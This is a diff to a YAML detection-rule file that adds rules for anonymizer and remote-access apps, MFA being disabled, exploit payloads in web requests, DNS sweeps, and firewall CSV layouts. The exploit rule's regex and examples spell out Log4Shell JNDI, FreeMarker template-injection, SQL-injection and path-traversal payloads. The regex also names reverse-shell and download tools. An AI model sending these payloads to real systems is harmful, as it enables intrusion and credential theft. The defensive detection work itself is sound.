@@ -113,6 +113,49 @@ native:
       fires: [{WAFAttackScore: 5}, {WAFAttackScore: "20"}]
       quiet: [{WAFAttackScore: 21}, {WAFAttackScore: 99}, {WAFAttackScore: 0}]
 
+  - id: anonymizer-application
+    reason: "the firewall identified the application as an anonymizer (App-ID / application control)"
+    fields: [application, app, appName, app_name, applicationName, appid, appcat]
+    match: 'tor|tor2web|tor-browser|psiphon|ultrasurf|i2p|freegate|hotspot-shield|zeronet|torrent-?anonymizer'
+    severity: medium
+    examples:
+      fires: [{application: "tor"}, {app: "Psiphon"}]
+      quiet: [{application: "ssl"}, {application: "web-browsing"}, {app: "tortoise-svn"}]
+
+  - id: remote-access-application
+    reason: "the firewall identified a remote-access tool (often how intruders keep access)"
+    fields: [application, app, appName, app_name, applicationName, appid]
+    match: 'screenconnect|connectwise[- ]?control|anydesk|teamviewer|atera|splashtop|logmein|rustdesk|ngrok|meshcentral|simplehelp|netsupport'
+    severity: medium
+    examples:
+      fires: [{application: "screenconnect"}, {app: "AnyDesk"}]
+      quiet: [{application: "ms-rdp"}, {application: "ssh"}]
+
+  - id: mfa-weakened
+    reason: "multi-factor authentication was switched off, bypassed or removed for an account (Duo, Okta, AWS, Google)"
+    fields: [action, eventType, eventName, event.name, name, operationName, activityDisplayName, description, auth_status]
+    match: 'bypass_create|bypass_code.*|.*allow access without 2fa.*|user\.mfa\.factor\.(deactivate|reset_all)|system\.mfa\.factor\.deactivate|DeactivateMFADevice|DeleteVirtualMFADevice|2sv_disable|turn_off_2sv|.*disable.*(mfa|2fa|two[- ]?factor|2sv).*|Disable Strong Authentication'
+    severity: high
+    examples:
+      fires: [{action: "bypass_create"}, {eventType: "user.mfa.factor.deactivate"}, {eventName: "DeactivateMFADevice"},
+              {description: "Policy changed: Allow access without 2FA"}, {"event.name": "2sv_disable"}]
+      quiet: [{action: "user_update"}, {eventType: "user.mfa.factor.activate"}, {eventName: "ListMFADevices"}]
+
+  - id: exploit-payload-in-request
+    reason: "a request carries a known exploit payload (Log4Shell, template injection, SQL injection, path traversal, a shell in the URL)"
+    fields: [url, uri, request, c-uri, cs-uri-stem, cs-uri-query, http.url, url.original, url.full, requestUrl,
+             clientRequestURI, useragent, user_agent, c-useragent, cs(User-Agent), http.http_user_agent, http_user_agent,
+             uri_query, uri_path, query, query_string, request_uri, http_referer, referer, referrer, cs-referer,
+             cs(Referer), http.http_refer, cookie, http_cookie, http_x_forwarded_for, x_forwarded_for, http_x_header]
+    match: '.*(\$\{jndi:|\$%7bjndi|%24%7bjndi|\$\{(lower|upper|env|sys|date|::-)[^}]*\}|freemarker\.template\.utility\.execute|union(\s|%20|\+|/\*\*/)+(all(\s|%20|\+)+)?select|/etc/passwd|/etc/shadow|<script|%3cscript|\.\./\.\./|\.\.%2f\.\.%2f|%2e%2e%2f%2e%2e|\.\.\\\.\.\\|/bin/(ba)?sh|cmd\.exe|powershell(\.exe)?(\s|%20|\+)|/dev/tcp/|wget(\s|%20|\+)+https?:|curl(\s|%20|\+)+https?:).*'
+    severity: high
+    examples:
+      fires: [{url: "/api/v1/totp/user-backup-code/../../system/maintenance/archiving"}, {useragent: "${jndi:ldap://1.2.3.4/a}"},
+              {url: "portal.example.com/catalog-portal/ui/oauth/verify?error=&deviceUdid=${\"freemarker.template.utility.Execute\"?new()(\"id\")}"},
+              {cs-uri-query: "id=1 UNION SELECT username,password FROM users"}, {url: "/index.php?page=../../etc/passwd"}]
+      quiet: [{url: "/blog/2024/10/union-selection-results"}, {useragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+              {url: "/docs/../index.html"}, {url: "/static/js/app.js?v=2"}]
+
   - id: ids-alert-line-priority-1
     reason: "a Snort / Suricata alert line (fast.log, syslog) the sensor itself rated priority 1"
     fields: [text]
@@ -158,4 +201,36 @@ behaviour:
   beaconing:        {connections: 20, min_span_s: 1800, max_jitter: 0.2, min_interval_s: 10, max_interval_s: 3600, severity: medium}
   web-scan:         {paths: 50, window_s: 600, severity: medium}
   web-login-brute-force: {posts: 20, window_s: 600, severity: medium}
+  dns-ptr-sweep:    {lookups: 100, window_s: 600, severity: medium}
   dns-tunnel:       {subdomains: 100, window_s: 3600, long_label: 40, long_queries: 20, severity: medium}
+
+# layouts: header-less exports whose column ORDER the vendor documents. A line
+# that matches `line` is split on `delimiter` (inside the `csv` group when there
+# is one, after a syslog prefix) and named by `columns` -- the list chosen by the
+# value at `key_column` (0-based), else `default`. Data, not code: a box adds its
+# own layouts in the local file.
+layouts:
+  - id: panos-csv
+    reason: "Palo Alto PAN-OS syslog CSV (TRAFFIC / THREAT), documented field order"
+    line: '^(?:.*?\s)?(?P<csv>1,\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2},[^,]*,(?:TRAFFIC|THREAT|URL|WILDFIRE|DECRYPTION),.*)$'
+    delimiter: ","
+    key_column: 3
+    default: TRAFFIC
+    columns:
+      TRAFFIC: [future_use_1, receive_time, serial, type, subtype, future_use_2, generated_time, src_ip, dst_ip,
+                nat_src_ip, nat_dst_ip, policy_rule, src_user, dst_user, application, vsys, src_zone, dst_zone,
+                inbound_if, outbound_if, log_action, future_use_3, session_id, repeat_count, src_port, dst_port,
+                nat_src_port, nat_dst_port, flags, protocol, action, bytes, bytes_sent, bytes_received, packets,
+                start_time, elapsed_s, url_category, future_use_4, sequence, action_flags, src_location, dst_location]
+      THREAT: [future_use_1, receive_time, serial, type, subtype, future_use_2, generated_time, src_ip, dst_ip,
+               nat_src_ip, nat_dst_ip, policy_rule, src_user, dst_user, application, vsys, src_zone, dst_zone,
+               inbound_if, outbound_if, log_action, future_use_3, session_id, repeat_count, src_port, dst_port,
+               nat_src_port, nat_dst_port, flags, protocol, action, url, threat_content_name, category, severity,
+               direction, sequence, action_flags, src_location, dst_location]
+  - id: umbrella-dns-csv
+    reason: "Cisco Umbrella DNS log export (no header), documented field order"
+    line: '^"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}","[^"]*","[^"]*","[\d.]+","[\d.]+","(?:Allowed|Blocked)"'
+    delimiter: ","
+    columns:
+      default: [timestamp, host, identities, src_ip, nat_ip, action, query_type, response_code, domain, categories,
+                most_granular_identity_type, identity_types, blocked_categories]
